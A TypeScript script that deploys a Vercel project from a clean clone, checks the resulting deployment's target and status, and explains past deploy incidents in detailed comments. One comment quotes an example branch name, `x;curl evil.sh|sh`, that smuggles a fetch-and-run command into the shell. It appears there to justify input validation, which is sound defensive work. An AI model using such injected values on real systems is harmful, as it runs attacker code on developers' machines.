/**
 * Deploy this project to Vercel — one command per target.
 *
 * ═══════════════════════════════════════════════════════════════════════════
 * WHY THIS EXISTS: until now there was no deploy script at all. Every
 * deployment in this project's history was a hand-typed CLI invocation, and
 * four separate rules had to be remembered each time. Three of them have
 * already cost a production incident:
 *
 *   1. `vercel deploy` uploads the WORKING DIRECTORY, not a commit. This tree
 *      routinely holds another session's half-finished feature. A deploy from
 *      the repo root once shipped uncommitted mail code whose migration had
 *      not run, and live order reads answered `42703 undefined_column`.
 *   2. `.vercel/` is gitignored, so a fresh clone has no project link — and
 *      `--yes` in an unlinked directory happily creates a BRAND NEW project
 *      rather than failing.
 *   3. `--scope` is required whenever the cwd is not the linked root (which a
 *      temp clone never is), and its absence fails as `Not authorized` —
 *      which reads like an expired login rather than a missing flag.
 *   4. `vercel deploy --prod` has reported READY, exited 0, and silently
 *      produced a PREVIEW (`target: null`) while production went on serving
 *      the old bundle. Nothing in the success output says so.
 *
 * So: clone the branch (1), copy `.vercel/` in (2), always pass `--scope` (3),
 * and read `target` back off the finished deployment before calling it a
 * production release (4).
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * WHAT THIS DELIBERATELY DOES NOT DO:
 *   - It does not run the tests. `npx tsc -b && npm test` is ~10 minutes and
 *     belongs to your judgement, not to a deploy command's critical path.
 *   - It does not apply migrations. A merged migration must reach production
 *     BEFORE the code that reads it, never after; that ordering is yours.
 *   - It does not verify the live bundle changed. Asset hashes are the only
 *     honest proof a deploy landed — see the closing note this script prints.
 *
 *   npm run deploy:prod              # master -> production
 *   npm run deploy:dev               # current branch -> preview (+ dev alias)
 *   npm run deploy:prod -- --check   # print the plan, invoke nothing
 *
 * `--check` reports but never calls `vercel deploy`, so it is safe to run
 * against production at any time.
 */
import { execSync } from 'node:child_process';
import { cpSync, mkdtempSync, rmSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';

/** The CLI does not resolve `.vercel/project.json`'s orgId to this slug on its
 *  own, and WRITES fail without it while READS succeed — which is why the
 *  resulting `Not authorized` looks like a broken session and is not. */
const SCOPE = 'nattys-projects-05ebc986';

/** The production branch. Deploying anything else to production is a mistake
 *  worth making someone type out by hand. */
const PROD_BRANCH = 'master';

/** Where `--dev` points its preview.
 *
 *  TWO LEVELS DEEP ON PURPOSE, AND THAT HAS A COST: Cloudflare's Universal SSL
 *  covers `plaspool.com` and `*.plaspool.com` — ONE level — so it has no
 *  certificate for this host. The record must therefore be DNS-only (grey
 *  cloud) so Vercel terminates TLS and issues its own cert. Left proxied
 *  (orange), Cloudflare aborts the handshake outright and the request never
 *  reaches Vercel at all: curl reports SEC_E_ILLEGAL_MESSAGE and http_code 000,
 *  which looks like the deploy failed rather than like a DNS toggle.
 *
 *  When the alias fails the deploy itself still succeeded, so we warn and print
 *  the raw URL rather than failing the run. */
const DEV_ALIAS = 'admin.dev.plaspool.com';

const argv = process.argv.slice(2);
const CHECK = argv.includes('--check');
const PROD = argv.includes('--prod');
const DEV = argv.includes('--dev');

function die(message: string): never {
  console.error(`\n  x ${message}\n`);
  process.exit(1);
}

/** stdout captured, stderr inherited: `vercel deploy` streams build progress to
 *  stderr and prints only the deployment URL to stdout, so this shows the build
 *  live AND hands us the URL. */
function capture(cmd: string, cwd: string): string {
  return execSync(cmd, { cwd, encoding: 'utf8', stdio: ['inherit', 'pipe', 'inherit'] }).trim();
}

/** For reads whose output we parse but whose noise we do not want on screen. */
function quiet(cmd: string, cwd: string): string {
  return execSync(cmd, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] }).trim();
}

function tryQuiet(cmd: string, cwd: string): string | null {
  try {
    return quiet(cmd, cwd);
  } catch {
    return null;
  }
}

/* Every command below goes through a shell — `npx` is a .cmd on Windows and
   does not resolve without one. Git ref names, meanwhile, permit `;`, `$`,
   backticks and quotes: `git checkout -b 'x;curl evil.sh|sh'` is a VALID
   branch, and `npm run deploy:dev` would then run it. So the two values that
   reach a command string from outside this file are checked first. */
const SAFE_BRANCH = /^[A-Za-z0-9][A-Za-z0-9._/-]*$/;
const SAFE_URL = /^https:\/\/[A-Za-z0-9.-]+$/;

if (PROD === DEV) {
  die('Pass exactly one of --prod or --dev.\n    npm run deploy:prod\n    npm run deploy:dev');
}

const root = quiet('git rev-parse --show-toplevel', process.cwd());
const branch = PROD ? PROD_BRANCH : quiet('git rev-parse --abbrev-ref HEAD', root);
const target = PROD ? 'production' : 'preview';

if (DEV && branch === 'HEAD') {
  die('Detached HEAD has no branch to clone. Check out a branch first.');
}

if (!SAFE_BRANCH.test(branch)) {
  die(`Refusing to interpolate branch name "${branch}" into a shell command.\n    Rename it to letters, digits, dot, dash, underscore and slash only.`);
}

const head = tryQuiet(`git rev-parse --verify --quiet ${branch}`, root);
if (!head) die(`Branch "${branch}" does not exist locally.`);

const subject = quiet(`git log -1 --format=%s ${branch}`, root);
const shortSha = head.slice(0, 7);

console.log(`\n  ${target.toUpperCase()} deploy`);
console.log(`  branch    ${branch}`);
console.log(`  commit    ${shortSha}  ${subject}`);

/* Rule 1, made visible. The clone is the whole point — but somebody who just
   edited a file deserves to be told in as many words that their edit is not in
   this deploy, rather than discovering it from the live site. */
const dirty = quiet('git status --porcelain', root).split('\n').filter(Boolean).length;
if (dirty > 0) {
  console.log(`  note      ${dirty} uncommitted file(s) in the tree — NOT deployed (by design)`);
}

/* Local vs origin. Deploying a commit nobody else has is legitimate in a pinch
   and blocking it would be wrong, but doing it UNAWARE is how the wrong bundle
   ships, so production says it loudly. */
const remote = tryQuiet(`git rev-parse --verify --quiet origin/${branch}`, root);
if (remote && remote !== head) {
  const ahead = quiet(`git rev-list --count origin/${branch}..${branch}`, root);
  const behind = quiet(`git rev-list --count ${branch}..origin/${branch}`, root);
  const label = PROD ? 'WARNING  ' : 'note     ';
  console.log(`  ${label} ${branch} differs from origin/${branch} — ${ahead} ahead, ${behind} behind`);
}

if (DEV) {
  /* The Preview environment has its own env vars, and as of this writing
     DATABASE_URL and PAYSTACK_SECRET_KEY exist there as Sensitive values that
     nobody can read back. If they hold the production connection string and
     the live Paystack key, this command puts a second front door on the real
     commerce database. Say so every time until someone confirms otherwise. */
  console.log('\n  ! Preview uses the Preview env scope. Confirm DATABASE_URL and');
  console.log('    PAYSTACK_SECRET_KEY there are NOT the production values.');
}

if (!existsSync(path.join(root, '.vercel', 'project.json'))) {
  die('No .vercel/project.json — this tree is not linked, so the clone could not be either.');
}

if (CHECK) {
  console.log(`\n  --check: would deploy ${shortSha} to ${target}. Nothing was run.\n`);
  process.exit(0);
}

const workdir = mkdtempSync(path.join(tmpdir(), 'plaspool-deploy-'));

try {
  /* Rule 1: a clone of the COMMIT, so no working-tree contamination can ride
     along. --local --no-hardlinks keeps it cheap without sharing objects. */
  console.log(`\n  cloning ${branch} -> ${workdir}`);
  execSync(`git clone -q --local --no-hardlinks --branch ${branch} "${root}" "${workdir}"`, {
    stdio: 'inherit',
  });

  /* Rule 2: without this, --yes creates a new project instead of deploying. */
  cpSync(path.join(root, '.vercel'), path.join(workdir, '.vercel'), { recursive: true });

  /* Rule 3: --scope, always. The cwd here is never the linked root. */
  const flags = PROD ? '--prod --yes' : '--yes';
  console.log('  deploying...\n');

  /* A NON-ZERO EXIT DOES NOT MEAN THE DEPLOYMENT DID NOT HAPPEN. Measured
     2026-09-05: three runs in a row built cleanly, printed `Deploying
     outputs... Completing…`, then died on `{"reason":"deploy_failed",
     "message":"fetch failed"}` — the CLI's own final status poll losing the
     connection. All three deployments were live and `● Ready` in `vercel ls`
     seconds later. Treating that exit code as the answer would abandon a
     finished deployment and, worse, invite a retry that deploys it twice.
     So the exit code is a hint; the deployment's own status is the fact. */
  let stdout: string;
  try {
    stdout = capture(`npx vercel deploy ${flags} --scope ${SCOPE}`, workdir);
  } catch (err) {
    stdout = String((err as { stdout?: string }).stdout ?? '');
    console.log('\n  note      the CLI exited non-zero; checking whether the');
    console.log('            deployment landed anyway before believing it.');
  }

  /* THE CLI SPEAKS TWO DIALECTS AND YOU GET A DIFFERENT ONE THAN A HUMAN DOES.
     `--non-interactive` is implied "when an agent is detected" (its own --help
     says so), and in that mode a successful deploy prints a JSON envelope whose
     URL lives at `.deployment.url`. Run from a terminal it prints the bare URL
     on its own line instead. Scanning only for a line starting with https://
     therefore works when you run it and fails when CI or an agent does — which
     is the worst possible split, because it passes exactly where it is tested.
     Parse the JSON when it is there, fall back to the line, then to any URL. */
  const found = (() => {
    const brace = stdout.indexOf('{');
    if (brace !== -1) {
      try {
        const d = JSON.parse(stdout.slice(brace))?.deployment ?? {};
        if (typeof d.url === 'string') {
          return { url: d.url, state: d.readyState ?? null, target: d.target ?? null };
        }
      } catch {
        /* not JSON after all — fall through */
      }
    }
    const line = stdout.split('\n').map((l) => l.trim()).find((l) => l.startsWith('https://'));
    const any = /https:\/\/[a-z0-9-]+\.vercel\.app/.exec(stdout)?.[0];
    return { url: line ?? any ?? null, state: null, target: null };
  })();

  const url = found.url;
  if (!url) die(`No deployment URL in the CLI output, so nothing was created:\n${stdout}`);
  if (!SAFE_URL.test(url)) die(`Refusing to shell out with an unexpected deployment URL: ${url}`);

  /* Rule 4: the whole reason this is a script and not a shell alias. A --prod
     deploy that quietly landed in Preview reports success in every other way,
     so the only honest check is reading `target` back off the deployment.
     The JSON dialect already carries target and readyState; the text one does
     not, so ask `inspect` only when we actually need to. */
  let actual = found.target;
  let state = found.state;
  if (state === null) {
    const inspected = execSync(`npx vercel inspect ${url} --scope ${SCOPE}`, {
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe'],
    });
    actual = /^\s*target\s+(\S+)\s*$/m.exec(inspected)?.[1] ?? null;
    state = /^\s*status\s+\S*\s*(\S+)\s*$/m.exec(inspected)?.[1] ?? null;
  }

  /* "READY" from the JSON, "Ready" from inspect. Same fact, two spellings. */
  if (String(state).toUpperCase() !== 'READY') {
    die(`Deployment ${url} is "${state ?? 'unknown'}", not Ready. Check:\n      npx vercel inspect ${url} --scope ${SCOPE}`);
  }

  console.log(`\n  url       ${url}`);
  /* A preview reports `target: null`, not "preview" — the same null CLAUDE.md
     warns about when a --prod deploy silently lands in Preview. Spell it out
     rather than printing "(none)", which reads like something went wrong. */
  console.log(`  target    ${actual ?? 'null (preview)'}`);

  if (PROD && actual !== 'production') {
    console.error(`\n  x Asked for production and got "${actual}". The build is fine — it`);
    console.error('    landed in the wrong environment. Promote it without rebuilding:\n');
    console.error(`      npx vercel promote ${url} --yes --scope ${SCOPE}\n`);
    process.exit(1);
  }

  if (PROD) {
    /* "Auto-assign Custom Production Domains" is enabled on this project, and
       it covers CLI deploys carrying --prod. Every custom domain on the project
       is therefore re-pointed at THIS deployment — including the dev host, which
       is on the list only because a Vercel project with no Git integration has
       no preview slot to put a domain in. So a production deploy silently steals
       the dev URL, and it then serves production under a name that production's
       own APP_ORIGINS does not list, which surfaces as CORS failures on a screen
       that looks otherwise fine. Self-healing on the next deploy:dev — but only
       if you know to run it. */
    console.log(`\n  ! ${DEV_ALIAS} has just been re-assigned to THIS production`);
    console.log('    deployment by auto-assign. Run `npm run deploy:dev` to take it back.');
  }

  if (DEV) {
    try {
      execSync(`npx vercel alias set ${url} ${DEV_ALIAS} --scope ${SCOPE}`, { stdio: 'inherit' });
      console.log(`\n  alias     https://${DEV_ALIAS}`);
    } catch {
      /* The deploy succeeded; only the alias did not. Degrade to the raw URL
         rather than failing a run that actually shipped something. */
      console.log(`\n  note      could not alias ${DEV_ALIAS} — it may not be on the`);
      console.log('            project or in DNS yet. The preview URL above works.');
    }
  }

  console.log(`\n  ok  ${target} deploy of ${shortSha} complete.`);
  console.log('\n  The dashboard is not proof. Confirm the live bundle actually changed:');
  const probe = PROD ? 'https://admin.plaspool.com' : url;
  console.log(`    curl -s -H 'Cache-Control: no-cache' ${probe} | grep -o 'index-[^.]*\\.js'\n`);
} finally {
  /* Cleanup must NEVER be what fails the run. On Windows a just-exited child
     (npx/vercel) can still hold a handle on the clone, and git leaves pack
     files read-only, so rmSync throws EPERM — from inside `finally`, which
     REPLACES whatever error the deploy itself raised. That is how a real build
     failure came back as an unrelated filesystem trace. Retry, then give up
     loudly but harmlessly. */
  try {
    rmSync(workdir, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
  } catch {
    console.log(`\n  note      could not remove ${workdir} — delete it by hand.`);
  }
}
